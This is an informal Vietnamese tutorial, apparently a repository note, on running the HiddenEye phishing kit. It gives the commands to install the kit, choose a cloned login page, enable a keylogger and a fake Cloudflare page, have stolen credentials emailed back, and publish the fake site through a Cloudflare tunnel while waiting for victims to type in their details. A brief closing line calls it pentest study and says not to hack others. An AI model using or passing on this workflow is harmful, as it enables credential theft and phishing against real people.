Đầu tiên là sẽ tải về ở url này: `git clone https://gitlab.com/an0nud4y/HiddenEye`

```
cd HiddenEye
sudo chmod +x HiddenEye.py
python3 -m venv venv
source venv/bin/activate
sudo ./HiddenEye.py -f
```
nó sẽ hỏi có muốn cài đặt LOCALTUNNEL thì nhấn N

hỏi dùng cho mục đích học thuật thì nhấn Y

chọn trang bạn thích clone

thích sài keylogger thì add vô

fake cloudflare thì này nên nè

có gửi mail về lun thì tùy nghe

khi mà nạn nhân mắc bẫy rồi nghĩa là nhập thông tin mình muốn có rồi thì sẽ redirect lại trang giống như như mình fake nha

còn cổng 80 hoặc 443 cho dễ sài

rồi bạn chọn chạy bằng localhost nhấn số 0

sau đó nhập địa chỉ local là 127.0.0.1

rồi giờ mở thêm 1 terminal để mở web ra ngoài internet `cloudflared tunnel --url http://127.0.0.1:80`

nếu bạn chưa cài cloudflare tunnel thì sử dụng các command dưới đây nhe

```
wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb
cloudflared --version
```

<img width="1938" height="152" alt="image" src="https://github.com/user-attachments/assets/cee1b7e7-16ed-4413-a840-e80857a4e478" />

giờ thì đợi victim nhập hoi nghe

<img width="1470" height="174" alt="image" src="https://github.com/user-attachments/assets/7c6ae2ad-b477-4482-9133-99840db21509" />

này chỉ phục vụ cho việc học tập pentest hoi nha, đừng ik hack người khác, vã lại giao diện này cũ òi người ta khó bị lừa lắm



